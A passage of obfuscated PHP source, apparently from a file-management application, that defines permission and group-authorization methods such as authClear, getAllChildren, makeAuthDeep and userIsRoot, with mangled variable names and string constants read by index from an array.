¾§ŞÃ)) { show_json(LNG($ÁŞ…ª¬á[1998]), !1); } if ($‹¾õá != $åØ…¨ç) { if ($®âäš[$ÁŞ…ª¬á[408]] == SourceModel::TYPE_GROUP) { } if ($®âäš[$ÁŞ…ª¬á[501]] != 0 && !in_array($®âäš[$ÁŞ…ª¬á[501]], $Ï¶ÎÈœã)) { } } if ($®âäš[$ÁŞ…ª¬á[501]] == 0) { $®âäš[$ÁŞ…ª¬á[408]] = SourceModel::TYPE_USER; } $¨Í²Ì¦[] = array($ÁŞ…ª¬á[399] => $Ú¤î´µŒ, $ÁŞ…ª¬á[408] => intval($®âäš[$ÁŞ…ª¬á[408]]), $ÁŞ…ª¬á[501] => intval($®âäš[$ÁŞ…ª¬á[501]]), $ÁŞ…ª¬á[1926] => intval($®âäš[$ÁŞ…ª¬á[1926]]) ? intval($®âäš[$ÁŞ…ª¬á[1926]]) : 0, $ÁŞ…ª¬á[1980] => intval($®âäš[$ÁŞ…ª¬á[1980]]) ? intval($®âäš[$ÁŞ…ª¬á[1980]]) : -1); } $this->where(array($ÁŞ…ª¬á[414] => $Ú¤î´µŒ))->delete(); $this->addAll($¨Í²Ì¦); return !0; } public function authClear($Ÿ‰Ù¶şÃ) { $¡ø îøê =& $_SERVER[Ôó‡è­ƒ]; $˜²ÔçÂô = Model($¡ø îøê[1325])->sourceInfo($Ÿ‰Ù¶şÃ); $É¥ŸûĞİ = array($Ÿ‰Ù¶şÃ); if ($˜²ÔçÂô[$¡ø îøê[407]] == $¡ø îøê[89]) { $Â‹ïØ… = array($¡ø îøê[583] => array($¡ø îøê[543], $˜²ÔçÂô[$¡ø îøê[517]] . $Ÿ‰Ù¶şÃ . $¡ø îøê[544])); $É¥ŸûĞİ = Model($¡ø îøê[1325])->field($¡ø îøê[414])->where($Â‹ïØ…)->getField($¡ø îøê[399], !0); $É¥ŸûĞİ[] = $Ÿ‰Ù¶şÃ; } $this->where(array($¡ø îøê[414] => array($¡ø îøê[415], $É¥ŸûĞİ)))->delete(); return !0; } public function getAllChildren($Š¤Ê½ô) { $ùµğÏ =& $_SERVER[Ôó‡è­ƒ]; $êü€Ã°Í = Model($ùµğÏ[1325])->sourceInfo($Š¤Ê½ô); if ($êü€Ã°Í[$ùµğÏ[407]] != $ùµğÏ[89]) { return $this->sourceListAuth(array($Š¤Ê½ô)); } if ($êü€Ã°Í[$ùµğÏ[408]] != SourceModel::TYPE_GROUP) { return array(); } $¸ìíº¢“ = 1; $ğéÑ¡®Œ = array($Š¤Ê½ô); if ($êü€Ã°Í[$ùµğÏ[494]] == $ùµğÏ[194] && $êü€Ã°Í[$ùµğÏ[501]] != $¸ìíº¢“) { $ğéÑ¡®Œ = $this->groupChidldAllRootSource($êü€Ã°Í[$ùµğÏ[501]]); } $ÀßÑŞëå = $this->field($ùµğÏ[399])->group($ùµğÏ[399])->select(); $ÀßÑŞëå = array_to_keyvalue($ÀßÑŞëå, $ùµğÏ[12], $ùµğÏ[399]); if (!$ÀßÑŞëå) { return array(); } $¾îÏËü = $ùµğÏ[1999]; $¿›íË…Å = array($ùµğÏ[399] => array($ùµğÏ[7], $ÀßÑŞëå), $ùµğÏ[427] => $ùµğÏ[194]); $áÉËú… = Model($ùµğÏ[823])->field($¾îÏËü)->where($¿›íË…Å)->select(); $­ÙŒŸó§ = array($Š¤Ê½ô); foreach ($áÉËú… as $áší™Ñ‘) { foreach ($ğéÑ¡®Œ as $“Ô¶Ä’) { $œ€¦‰¡ˆ = $ùµğÏ[50] . $“Ô¶Ä’ . $ùµğÏ[50]; $¨„òñÑ§ = $áší™Ñ‘[$ùµğÏ[517]] . $áší™Ñ‘[$ùµğÏ[399]] . $ùµğÏ[50]; if (strstr($¨„òñÑ§, $œ€¦‰¡ˆ)) { $­ÙŒŸó§[] = $áší™Ñ‘[$ùµğÏ[399]]; break; } } } return $this->sourceListAuth($­ÙŒŸó§); } private function sourceListAuth($Ø…™ö) { $Ñ‘æ²‡ =& $_SERVER[Ôó‡è­ƒ]; $¯º¬áÏ = Model($Ñ‘æ²‡[1325])->sourceListInfo($Ø…™ö, !0); $î‹ßÔö” = $this->sourceAuthSelect($Ø…™ö); $Şæ‚£Ë = array(); $ĞÆ˜œŞ¿ = array(); foreach ($¯º¬áÏ as $àü½É´¤) { unset($àü½É´¤[$Ñ‘æ²‡[450]]); unset($àü½É´¤[$Ñ‘æ²‡[448]]); unset($àü½É´¤[$Ñ‘æ²‡[410]]); unset($àü½É´¤[$Ñ‘æ²‡[87]]); $Ğ·ê­© = $î‹ßÔö”[$àü½É´¤[$Ñ‘æ²‡[399]]]; if (!$Ğ·ê­©) { continue; } $àü½É´¤[$Ñ‘æ²‡[2000]] = $this->authTargetInfo($Ğ·ê­©); $àü½É´¤[$Ñ‘æ²‡[515]] = rtrim($àü½É´¤[$Ñ‘æ²‡[521]], $Ñ‘æ²‡[8]) . $Ñ‘æ²‡[8] . ltrim($àü½É´¤[$Ñ‘æ²‡[515]], $Ñ‘æ²‡[8]); $Şæ‚£Ë[] = $àü½É´¤; $“ËÛ†àÔ = count(explode($Ñ‘æ²‡[8], trim($àü½É´¤[$Ñ‘æ²‡[515]], $Ñ‘æ²‡[8]))); $ĞÆ˜œŞ¿[] = $“ËÛ†àÔ + ($àü½É´¤[$Ñ‘æ²‡[33]] == $Ñ‘æ²‡[79] ? 0 : 1000); } array_multisort($ĞÆ˜œŞ¿, SORT_ASC, $Şæ‚£Ë); return $Şæ‚£Ë; } private function groupChidldAllRootSource($ş¡Š·£ò) { $”Ä³Ñ«× =& $_SERVER[Ôó‡è­ƒ]; $€îşÙ‡ô = Model($”Ä³Ñ«×[2001])->groupChildrenAll($ş¡Š·£ò); $ğ„§©¯‚ = array($”Ä³Ñ«×[494] => 0, $”Ä³Ñ«×[501] => array($”Ä³Ñ«×[7], $€îşÙ‡ô), $”Ä³Ñ«×[408] => SourceModel::TYPE_GROUP); $…Œ×Š = Model($”Ä³Ñ«×[823])->field($”Ä³Ñ«×[399])->where($ğ„§©¯‚)->select(); $…Œ×Š = array_to_keyvalue($…Œ×Š, $”Ä³Ñ«×[12], $”Ä³Ñ«×[399]); return $…Œ×Š; } private function authTargetInfo($©Ê‚³â) { $šäÂƒ² =& $_SERVER[Ôó‡è­ƒ]; $Ãßå´µò = array(); $Ôâ‰ş„· = array(); $š³î¡á¦ = 2 << 25; foreach ($©Ê‚³â as $Œî¯´æ„) { $¦ïƒÌµ¯ = Model($šäÂƒ²[503])->listData($Œî¯´æ„[$šäÂƒ²[1926]]); if (!$¦ïƒÌµ¯) { continue; } if ($Œî¯´æ„[$šäÂƒ²[408]] == SourceModel::TYPE_USER) { $˜Ú¢—¡Á = Model($šäÂƒ²[509])->getInfoSimpleOuter($Œî¯´æ„[$šäÂƒ²[501]]); if ($˜Ú¢—¡Á[$šäÂƒ²[1655]] == $šäÂƒ²[1188]) { continue; } if ($˜Ú¢—¡Á[$šäÂƒ²[1655]] == $šäÂƒ²[194]) { $˜Ú¢—¡Á[$šäÂƒ²[32]] = LNG($šäÂƒ²[2002]); } } else { $˜Ú¢—¡Á = Model($šäÂƒ²[518])->getInfoSimple($Œî¯´æ„[$šäÂƒ²[501]]); } if (!$˜Ú¢—¡Á) { continue; } $˜Ú¢—¡Á[$šäÂƒ²[462]] = $¦ïƒÌµ¯; $Ãßå´µò[] = $˜Ú¢—¡Á; $Öß†Ğ´ = 0; if ($Œî¯´æ„[$šäÂƒ²[408]] == SourceModel::TYPE_GROUP) { $Öß†Ğ´ = $š³î¡á¦ * 2; } if ($Œî¯´æ„[$šäÂƒ²[408]] == SourceModel::TYPE_USER) { $Öß†Ğ´ = $š³î¡á¦; } if ($Œî¯´æ„[$šäÂƒ²[408]] == SourceModel::TYPE_USER && $Œî¯´æ„[$šäÂƒ²[501]] == $šäÂƒ²[194]) { $Öß†Ğ´ = 0; } $Ôâ‰ş„·[] = $¦ïƒÌµ¯[$šäÂƒ²[410]] + $Öß†Ğ´; } array_multisort($Ôâ‰ş„·, SORT_DESC, $Ãßå´µò); return $Ãßå´µò; } public function getAllChildrenByUser($±ó¸‚íÍ, $âĞ¬¯Áæ) { $À×ò—‘Î =& $_SERVER[Ôó‡è­ƒ]; $ÌÆû±µ› = Model($À×ò—‘Î[537])->getInfo($âĞ¬¯Áæ); if (!$âĞ¬¯Áæ || !$±ó¸‚íÍ || !$ÌÆû±µ›) { return array(); } $°…ÙÚš‰ = Model($À×ò—‘Î[1325])->sourceInfo($±ó¸‚íÍ); $è¾­€Î˜ = array(); $ˆœñµ¾ = 1; if ($°…ÙÚš‰[$À×ò—‘Î[494]] == $À×ò—‘Î[194] && $°…ÙÚš‰[$À×ò—‘Î[501]] != $ˆœñµ¾ && $this->groupContainUser($°…ÙÚš‰[$À×ò—‘Î[501]], $âĞ¬¯Áæ)) { foreach ($ÌÆû±µ›[$À×ò—‘Î[2003]] as $·½ú­°Ó) { $ÅÎİµîå = Model($À×ò—‘Î[518])->getInfo($·½ú­°Ó[$À×ò—‘Î[1823]]); $Äù¦ö³ = Model($À×ò—‘Î[537])->getInfoSimpleOuter($âĞ¬¯Áæ); $Äù¦ö³[$À×ò—‘Î[462]] = $·½ú­°Ó[$À×ò—‘Î[410]]; if (Model($À×ò—‘Î[503])->authCheckAction($·½ú­°Ó[$À×ò—‘Î[410]][$À×ò—‘Î[410]], $À×ò—‘Î[1843])) { continue; } $œÜ‚íÉş = array($À×ò—‘Î[32] => $À×ò—‘Î[1604] . $ÅÎİµîå[$À×ò—‘Î[32]], $À×ò—‘Î[399] => $ÅÎİµîå[$À×ò—‘Î[87]][$À×ò—‘Î[399]], $À×ò—‘Î[78] => KodIO::make($ÅÎİµîå[$À×ò—‘Î[87]][$À×ò—‘Î[399]]), $À×ò—‘Î[494] => $À×ò—‘Î[194], $À×ò—‘Î[408] => $À×ò—‘Î[511], $À×ò—‘Î[33] => $À×ò—‘Î[547], $À×ò—‘Î[515] => $ÅÎİµîå[$À×ò—‘Î[522]], $À×ò—‘Î[1823] => $ÅÎİµîå[$À×ò—‘Î[1823]], $À×ò—‘Î[519] => $ÅÎİµîå[$À×ò—‘Î[494]], $À×ò—‘Î[2000] => array($Äù¦ö³)); $è¾­€Î˜[$œÜ‚íÉş[$À×ò—‘Î[399]]] = $œÜ‚íÉş; } } $òÜÙ¼ÍÌ = array(); $ ÌË‚Õı = $this->getAllChildren($±ó¸‚íÍ); foreach ($ ÌË‚Õı as $Îæ¡ıÃ¦) { $’ˆ‡«ì = !1; foreach ($Îæ¡ıÃ¦[$À×ò—‘Î[2000]] as $°×ìø·Ÿ) { if ($°×ìø·Ÿ[$À×ò—‘Î[1655]]) { if ($°×ìø·Ÿ[$À×ò—‘Î[1655]] == $âĞ¬¯Áæ) { $’ˆ‡«ì = !0; break; } } if ($°×ìø·Ÿ[$À×ò—‘Î[1823]]) { if ($this->groupContainUser($°×ìø·Ÿ[$À×ò—‘Î[1823]], $âĞ¬¯Áæ)) { $’ˆ‡«ì = !0; break; } } } if ($’ˆ‡«ì) { $òÜÙ¼ÍÌ[] = $Îæ¡ıÃ¦; } $¼’·¶á = $Îæ¡ıÃ¦[$À×ò—‘Î[399]]; if (isset($è¾­€Î˜[$¼’·¶á])) { $Îæ¡ıÃ¦[$À×ò—‘Î[2000]][] = $è¾­€Î˜[$¼’·¶á][0]; $è¾­€Î˜[$¼’·¶á] = !1; } } $è¾­€Î˜ = array_filter(array_values($è¾­€Î˜)); $òÜÙ¼ÍÌ = array_merge($è¾­€Î˜, $òÜÙ¼ÍÌ); return $òÜÙ¼ÍÌ; } public function setAllChildrenByUser($ÉÌäù¢¶, $Ì ß‹Š, $—šÔ¢š×) { $´ÒÜ¢ŸÃ =& $_SERVER[Ôó‡è­ƒ]; $Èù¡ïëÜ = $this->getAllChildrenByUser($ÉÌäù¢¶, $Ì ß‹Š); if (!$—šÔ¢š× || !$Èù¡ïëÜ) { return !1; } foreach ($Èù¡ïëÜ as $Òş­…¢İ) { $¶“øØÓş = array(); foreach ($Òş­…¢İ[$´ÒÜ¢ŸÃ[2000]] as $×««¼Ö) { $¦¡±ëÁ² = $×««¼Ö[$´ÒÜ¢ŸÃ[462]]; $ó··èÑ = $×««¼Ö[$´ÒÜ¢ŸÃ[1655]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $Í‚¹Éİœ = $×««¼Ö[$´ÒÜ¢ŸÃ[1655]] ? $×««¼Ö[$´ÒÜ¢ŸÃ[1655]] : $×««¼Ö[$´ÒÜ¢ŸÃ[1823]]; if ($×««¼Ö[$´ÒÜ¢ŸÃ[1655]] && $×««¼Ö[$´ÒÜ¢ŸÃ[1655]] == $Ì ß‹Š) { continue; } $¶“øØÓş[] = array($´ÒÜ¢ŸÃ[399] => $Òş­…¢İ[$´ÒÜ¢ŸÃ[399]], $´ÒÜ¢ŸÃ[408] => $ó··èÑ, $´ÒÜ¢ŸÃ[501] => intval($Í‚¹Éİœ), $´ÒÜ¢ŸÃ[1926] => isset($¦¡±ëÁ²[$´ÒÜ¢ŸÃ[396]]) ? intval($¦¡±ëÁ²[$´ÒÜ¢ŸÃ[396]]) : 0, $´ÒÜ¢ŸÃ[1980] => isset($¦¡±ëÁ²[$´ÒÜ¢ŸÃ[1980]]) ? intval($¦¡±ëÁ²[$´ÒÜ¢ŸÃ[1980]]) : -1); } $¶“øØÓş[] = array($´ÒÜ¢ŸÃ[399] => $Òş­…¢İ[$´ÒÜ¢ŸÃ[399]], $´ÒÜ¢ŸÃ[408] => SourceModel::TYPE_USER, $´ÒÜ¢ŸÃ[501] => intval($Ì ß‹Š), $´ÒÜ¢ŸÃ[1926] => intval($—šÔ¢š×), $´ÒÜ¢ŸÃ[1980] => -1); $this->where(array($´ÒÜ¢ŸÃ[414] => $Òş­…¢İ[$´ÒÜ¢ŸÃ[399]]))->delete(); $this->addAll($¶“øØÓş); } return !0; } public function get($ÌÆÀß÷“) { $––»ò‹Æ = $this->getSourceList(array($ÌÆÀß÷“), !0); return $––»ò‹Æ[0]; } public function getSourceList($·Ùº¾ÁÃ, $âÆ¿ê³ü = false, $ïçâ–ñÙ = false) { $êÕ•Ü¶´ =& $_SERVER[Ôó‡è­ƒ]; if (!$·Ùº¾ÁÃ) { return array(); } $äÑØã† = Model($êÕ•Ü¶´[1325]); if (!$âÆ¿ê³ü && count($·Ùº¾ÁÃ) == 1) { $âÆ¿ê³ü = array(); $âÆ¿ê³ü[$·Ùº¾ÁÃ[0]] = $äÑØã†->sourceInfo($·Ùº¾ÁÃ[0]); } if (!$âÆ¿ê³ü) { $÷Ÿ‡ş×Ã = array($êÕ•Ü¶´[414] => array($êÕ•Ü¶´[415], $·Ùº¾ÁÃ)); $âÆ¿ê³ü = $äÑØã†->field($êÕ•Ü¶´[2004])->where($÷Ÿ‡ş×Ã)->select(); $âÆ¿ê³ü = array_to_keyvalue($âÆ¿ê³ü, $êÕ•Ü¶´[399]); } $¡õÑª´Ğ = $·Ùº¾ÁÃ; foreach ($âÆ¿ê³ü as $ÉóÏ´êÁ => $»À“Æ»à) { $Òˆ†ÆÉœ = $äÑØã†->parentLevelArray($»À“Æ»à[$êÕ•Ü¶´[517]]); $¡õÑª´Ğ = array_merge($¡õÑª´Ğ, array($ÉóÏ´êÁ), array_reverse($Òˆ†ÆÉœ)); } $¡õÑª´Ğ = array_values(array_unique($¡õÑª´Ğ)); if (!$¡õÑª´Ğ) { return array(); } $´…ÔÏ–× = $this->sourceAuthSelect($¡õÑª´Ğ); $Š’ûã¾© = array(); foreach ($¡õÑª´Ğ as $¦¿¯¸) { if (isset($´…ÔÏ–×[$¦¿¯¸])) { $Š’ûã¾©[$¦¿¯¸] = $´…ÔÏ–×[$¦¿¯¸]; } } $ÕãĞÉ”À = $this->userIsRoot($ïçâ–ñÙ); $¿œ¶ šÆ = AuthModel::authAll(); $Èú’ˆ†¬ = array($êÕ•Ü¶´[411] => $¿œ¶ šÆ, $êÕ•Ü¶´[2005] => array($êÕ•Ü¶´[416] => 0, $êÕ•Ü¶´[1829] => $¿œ¶ šÆ, $êÕ•Ü¶´[417] => LNG($êÕ•Ü¶´[2006]), $êÕ•Ü¶´[1845] => $êÕ•Ü¶´[2007])); $¯ÔÁŠŸÙ = array(); foreach ($âÆ¿ê³ü as $¦¿¯¸ => $«¥›ØÎÃ) { if ($ÕãĞÉ”À) { $¯ÔÁŠŸÙ[$¦¿¯¸] = $Èú’ˆ†¬; continue; } $¯ÔÁŠŸÙ[$¦¿¯¸] = $this->makeSourceAuth($«¥›ØÎÃ, $Š’ûã¾©, $ïçâ–ñÙ); } return $¯ÔÁŠŸÙ; } public function authDeepCheck($Âììğ¤, $äì¥éÄ = false) { $û¾Æ³Ö¥ =& $_SERVER[Ôó‡è­ƒ]; $äì¥éÄ = $äì¥éÄ ? $äì¥éÄ : USER_ID; $‹ëÑè…ó = $this->makeAuthDeep($äì¥éÄ); if (!in_array($Âììğ¤, $‹ëÑè…ó[$û¾Æ³Ö¥[2008]])) { return !1; } $ÒûÊÆÛµ = array(); foreach ($‹ëÑè…ó[$û¾Æ³Ö¥[2009]] as $Ö–†û­Ä => $ÔİÌ¸èë) { if (!in_array($Âììğ¤, $ÔİÌ¸èë)) { continue; } $ÒûÊÆÛµ[] = $Ö–†û­Ä; } if (!$ÒûÊÆÛµ) { return !1; } $®¥Ï‘ŞÆ = $ÒûÊÆÛµ ? $ÒûÊÆÛµ[0] : $Âììğ¤; return array($û¾Æ³Ö¥[411] => -1, $û¾Æ³Ö¥[462] => array($û¾Æ³Ö¥[416] => $û¾Æ³Ö¥[1188], $û¾Æ³Ö¥[1829] => $û¾Æ³Ö¥[194], $û¾Æ³Ö¥[417] => LNG($û¾Æ³Ö¥[2010]), $û¾Æ³Ö¥[1845] => $û¾Æ³Ö¥[2011]), $û¾Æ³Ö¥[2012] => LNG($û¾Æ³Ö¥[2013]), $û¾Æ³Ö¥[2014] => $this->sourceAuthInfo($®¥Ï‘ŞÆ)); } protected function makeAuthDeep($ñã£ûáÆ = false) { $å»ÒÉ¿¹ =& $_SERVER[Ôó‡è­ƒ]; static $çˆ² ·Ş = array(); $ñã£ûáÆ = $ñã£ûáÆ ? $ñã£ûáÆ : USER_ID; if (isset($çˆ² ·Ş[$ñã£ûáÆ])) { return $çˆ² ·Ş[$ñã£ûáÆ]; } $æ¶Ö¬ª· = Model($å»ÒÉ¿¹[2015])->listData(); $©Âàª§‹ = array(); foreach ($æ¶Ö¬ª· as $´ú‡…­Û) { if ($´ú‡…­Û[$å»ÒÉ¿¹[410]] == 0 && $´ú‡…­Û[$å»ÒÉ¿¹[1844]] == $å»ÒÉ¿¹[89]) { $©Âàª§‹[] = $´ú‡…­Û[$å»ÒÉ¿¹[396]]; } } $Ëø½±ÙÕ = $this->userGroupParents($ñã£ûáÆ); $ÂÅÆƒİ = array($å»ÒÉ¿¹[408] => SourceModel::TYPE_USER, $å»ÒÉ¿¹[501] => $ñã£ûáÆ); if ($Ëø½±ÙÕ) { $ÂÅÆƒİ = array(array($å»ÒÉ¿¹[408] => SourceModel::TYPE_USER, $å»ÒÉ¿¹[501] => $ñã£ûáÆ), array($å»ÒÉ¿¹[408] => SourceModel::TYPE_GROUP, $å»ÒÉ¿¹[501] => array($å»ÒÉ¿¹[415], $Ëø½±ÙÕ)), $å»ÒÉ¿¹[1000] => $å»ÒÉ¿¹[1920]); } $Ã…£º©Ö = $this->field($å»ÒÉ¿¹[2016])->where($ÂÅÆƒİ)->select(); $Ù¬äš¡• = array(); $Ü‹‡Íö‘ = array_to_keyvalue_group($Ã…£º©Ö, $å»ÒÉ¿¹[399]); foreach ($Ü‹‡Íö‘ as $Œúô¨Ó© => $„ ÛÍé) { $‰©±ºÓ³ = $this->authArrayCheck($„ ÛÍé, $ñã£ûáÆ); if ($‰©±ºÓ³[$å»ÒÉ¿¹[411]] > 0) { $Ù¬äš¡•[] = $Œúô¨Ó© . $å»ÒÉ¿¹[12]; } } if ($Ëø½±ÙÕ) { $úÍ²’õ = Model($å»ÒÉ¿¹[518]); foreach ($Ëø½±ÙÕ as $ Òºµ´Û) { $İ¥’¤£Î = $úÍ²’õ->getInfo($ Òºµ´Û); if (!$İ¥’¤£Î || !is_array($İ¥’¤£Î[$å»ÒÉ¿¹[87]])) { continue; } $Ù¬äš¡•[] = $İ¥’¤£Î[$å»ÒÉ¿¹[87]][$å»ÒÉ¿¹[399]]; } } $üÙä»ò‹ = array(); $ğ—Üª§ = $Ëø½±ÙÕ; $¬±ÇİÁ = Model($å»ÒÉ¿¹[1325]); $úÍ²’õ = Model($å»ÒÉ¿¹[518]); $Î Â›±– = array(); $Ê–İ«áÜ = array(); $Ç±ˆÍ‹æ = array(); $ÛªŠ‹’Ó = array(); if ($Ù¬äš¡•) { $Ì±ÅÕª = $¬±ÇİÁ->where(array($å»ÒÉ¿¹[399] => array($å»ÒÉ¿¹[415], $Ù¬äš¡•)))->select(); foreach ($Ì±ÅÕª as $½şò‘‘ì) { $‡‰¿Äş« = $¬±ÇİÁ->parentLevelArray($½şò‘‘ì[$å»ÒÉ¿¹[517]]); $üÙä»ò‹ = array_merge($üÙä»ò‹, $‡‰¿Äş«); $ğ—Üª§[] = $½şò‘‘ì[$å»ÒÉ¿¹[501]]; $Î Â›±–[$½şò‘‘ì[$å»ÒÉ¿¹[399]]] = $‡‰¿Äş«; $Ê–İ«áÜ[$½şò‘‘ì[$å»ÒÉ¿¹[399]]] = $½şò‘‘ì[$å»ÒÉ¿¹[501]]; } } $ğ—Üª§ = array_values(array_unique($ğ—Üª§)); $Èßı‰ßÅ = $ğ—Üª§; foreach ($Èßı‰ßÅ as $ Òºµ´Û) { $İ¥’¤£Î = $úÍ²’õ->getInfo($ Òºµ´Û); $‡‰¿Äş« = $¬±ÇİÁ->parentLevelArray($İ¥’¤£Î[$å»ÒÉ¿¹[517]]); $ğ—Üª§ = array_merge($ğ—Üª§, $‡‰¿Äş«); } $ğ—Üª§ = array_values(array_unique($ğ—Üª§)); foreach ($ğ—Üª§ as $ Òºµ´Û) { $İ¥’¤£Î = $úÍ²’õ->getInfo($ Òºµ´Û); $üÙä»ò‹[] = $İ¥’¤£Î[$å»ÒÉ¿¹[87]][$å»ÒÉ¿¹[399]]; $Ç±ˆÍ‹æ[$ Òºµ´Û] = $İ¥’¤£Î[$å»ÒÉ¿¹[87]][$å»ÒÉ¿¹[399]]; $ÛªŠ‹’Ó[$ Òºµ´Û] = $¬±ÇİÁ->parentLevelArray($İ¥’¤£Î[$å»ÒÉ¿¹[517]]); } foreach ($Î Â›±– as $Ê¯®İ‡ => $¾µ ‰ÂØ) { $ÊİÔæğ = $Ê–İ«áÜ[$Ê¯®İ‡]; if (!$ÊİÔæğ || !$Ç±ˆÍ‹æ[$ÊİÔæğ]) { continue; } $üæÉÖšı = array(); foreach ($ÛªŠ‹’Ó[$ÊİÔæğ] as $ Òºµ´Û) { $üæÉÖšı[] = $Ç±ˆÍ‹æ[$ Òºµ´Û]; } $Î Â›±–[$Ê¯®İ‡] = array_merge($üæÉÖšı, $¾µ ‰ÂØ); } $üÙä»ò‹ = array_values(array_unique($üÙä»ò‹)); $±ø¤¼¦Ÿ = array($å»ÒÉ¿¹[2008] => $üÙä»ò‹, $å»ÒÉ¿¹[2009] => $Î Â›±–); $çˆ² ·Ş[$ñã£ûáÆ] = $±ø¤¼¦Ÿ; return $±ø¤¼¦Ÿ; } private function makeSourceAuth($¢®ûÀå¦, $Ö´†¦¦Ú, $Õî±°¼ = false) { $ñºã™¼Ò =& $_SERVER[Ôó‡è­ƒ]; $›ÚŠøÍÔ = $ñºã™¼Ò[89]; $­³ùıÙ‰ = $¢®ûÀå¦[$ñºã™¼Ò[501]]; $ËÊˆş £ = $¢®ûÀå¦[$ñºã™¼Ò[408]] == SourceModel::TYPE_GROUP; $¡¦å…İğ = $ËÊˆş £ ? $this->groupRootAuth($­³ùıÙ‰, $Õî±°¼) : !1; if ($¡¦å…İğ && Model($ñºã™¼Ò[503])->authCheckAction($¡¦å…İğ[$ñºã™¼Ò[410]], $ñºã™¼Ò[1843])) { return $this->groupAuthInfo($¡¦å…İğ, $­³ùıÙ‰); } $Ú°¹Ùğ½ = Model($ñºã™¼Ò[1325])->parentLevelArray($¢®ûÀå¦[$ñºã™¼Ò[517]]); $Ú°¹Ùğ½ = array_merge(array($¢®ûÀå¦[$ñºã™¼Ò[399]]), array_reverse($Ú°¹Ùğ½)); $ÎÑæİá¡ = !1; foreach ($Ú°¹Ùğ½ as $üõ¿‰Âò) { if (!isset($Ö´†¦¦Ú[$üõ¿‰Âò])) { continue; } $Ì³¼î÷Õ = $this->authMake($Ö´†¦¦Ú[$üõ¿‰Âò], $Õî±°¼); if ($Ì³¼î÷Õ[$ñºã™¼Ò[462]]) { $ÎÑæİá¡ = $Ì³¼î÷Õ; break; } } if (!$ËÊˆş £) { return $ÎÑæİá¡; } if (!$ÎÑæİá¡ && $¡¦å…İğ) { $ÎÑæİá¡ = $this->groupAuthInfo($¡¦å…İğ, $­³ùıÙ‰); } if (!$ÎÑæİá¡) { $Á“˜Ş³ª = Model($ñºã™¼Ò[518])->getInfo($­³ùıÙ‰); $ùã¿Òà¶ = explode($ñºã™¼Ò[50], trim($Á“˜Ş³ª[$ñºã™¼Ò[517]], $ñºã™¼Ò[50])); $ùã¿Òà¶ = array_reverse($ùã¿Òà¶); foreach ($ùã¿Òà¶ as $Ì¨½ŞÛƒ) { if ($Ì¨½ŞÛƒ == $ñºã™¼Ò[194] || $Ì¨½ŞÛƒ == $›ÚŠøÍÔ) { continue; } $èªìº® = $this->groupRootAuth($Ì¨½ŞÛƒ, $Õî±°¼); if (!$èªìº®) { continue; } $ÎÑæİá¡ = $this->groupAuthInfo($èªìº®, $Ì¨½ŞÛƒ); break; } } if (!$ÎÑæİá¡ || $ÎÑæİá¡[$ñºã™¼Ò[411]] <= 0) { $ûè­³áí = $this->authDeepCheck($¢®ûÀå¦[$ñºã™¼Ò[399]], $Õî±°¼); if ($ûè­³áí) { $ÎÑæİá¡ = $ûè­³áí; } } return $ÎÑæİá¡; } private function userIsRoot($Ûã¶×¶ = false) { $»³Ø±›í =& $_SERVER[Ôó‡è­ƒ]; if (!$Ûã¶×¶ && _get($GLOBALS, $»³Ø±›í[499])) { return !0; } $·ùîÔó‰ = Model($»³Ø±›í[537])->getInfo($Ûã¶×¶); $£ú”Á—• = Model($»³Ø±›í[2017])->listData($·ùîÔó‰[$»³Ø±›í[1535]]); if ($£ú”Á—• && $£ú”Á—•[$»³Ø±›í[507]][$»³Ø±›í[2018]] == 1) { return !0; } return !1; } private function sourceAuthInfo($×»±½²­) { $İÏÓÆ£È =& $_SERVER[Ôó‡è­ƒ]; $œ²ôªì´ = Model($İÏÓÆ£È[1325]); $ôó–èàÍ = $œ²ôªì´->sourceInfo($×»±½²­); if (!$ôó–èàÍ) { return !1; } $œ²ôªì´->groupPathDisplay($ôó–èàÍ); $‹Ôåæşø = array($ôó–èàÍ); $‹Ôåæşø = $œ²ôªì´->_listAppendPath($‹Ôåæşø); $ôó–èàÍ = $‹Ôåæşø[0]; $×Í¨Ôßª = $ôó–èàÍ[$İÏÓÆ£È[515]]; if (isset($ôó–èàÍ[$İÏÓÆ£È[523]])) { $ÅÍºŞ‡Ú = explode($İÏÓÆ£È[8], trim($ôó–èàÍ[$İÏÓÆ£È[515]], $İÏÓÆ£È[8])); array_shift($ÅÍºŞ‡Ú); $×Í¨Ôßª = $ôó–èàÍ[$İÏÓÆ£È[521]] . $İÏÓÆ£È[2019] . implode($İÏÓÆ£È[8], $ÅÍºŞ‡Ú); } return array($İÏÓÆ£È[417] => $ôó–èàÍ[$İÏÓÆ£È[32]], $İÏÓÆ£È[78] => KodIO::make($ôó–èàÍ[$İÏÓÆ£È[399]]), $İÏÓÆ£È[2020] => $×Í¨Ôßª); } private function groupAuthInfo($‚ÁÜ×è®, $×¨ûœíÍ) { $‰ˆ®µ± =& $_SERVER[Ôó‡è­ƒ]; $ÌÉá÷¬Û = Model($‰ˆ®µ±[518])->getInfo($×¨ûœíÍ); return array($‰ˆ®µ±[2021] => intval($‚ÁÜ×è®[$‰ˆ®µ±[410]]), $‰ˆ®µ±[2005] => $‚ÁÜ×è®, $‰ˆ®µ±[2022] => LNG($‰ˆ®µ±[2023]), $‰ˆ®µ±[2014] => array($‰ˆ®µ±[417] => $ÌÉá÷¬Û[$‰ˆ®µ±[32]], $‰ˆ®µ±[78] => KodIO::make($ÌÉá÷¬Û[$‰ˆ®µ±[87]][$‰ˆ®µ±[399]]), $‰ˆ®µ±[2020] => $ÌÉá÷¬Û[$‰ˆ®µ±[522]])); } protected function groupRootAuth($£¹şĞŞ, $ìÖŞÅù¦ = false) { $üš ¶ =& $_SERVER[Ôó‡è­ƒ]; $ìÖŞÅù¦ = $ìÖŞÅù¦ ? $ìÖŞÅù¦ : USER_ID; $Ä´Ş´«ı = $ìÖŞÅù¦ . $üš ¶[2024] . $£¹şĞŞ; static $…’¿ÊŸ÷ = array(); if (isset($…’¿ÊŸ÷[$Ä´Ş´«ı])) { return $…’¿ÊŸ÷[$Ä´Ş´«ı]; } $ßó„“‘’ = Model($üš ¶[518])->getInfo($£¹şĞŞ); $¥ÄĞ›·­ = $this->userGroupList($ìÖŞÅù¦); $éÏ°¤å« = isset($¥ÄĞ›·­[$£¹şĞŞ]) ? $¥ÄĞ›·­[$£¹şĞŞ][$üš ¶[410]] : !1; if ($éÏ°¤å« && Model($üš ¶[503])->authCheckAction($éÏ°¤å«[$üš ¶[410]], $üš ¶[1843])) { $…’¿ÊŸ÷[$Ä´Ş´«ı] = $éÏ°¤å«; return $éÏ°¤å«; } $ß¼úáµú = 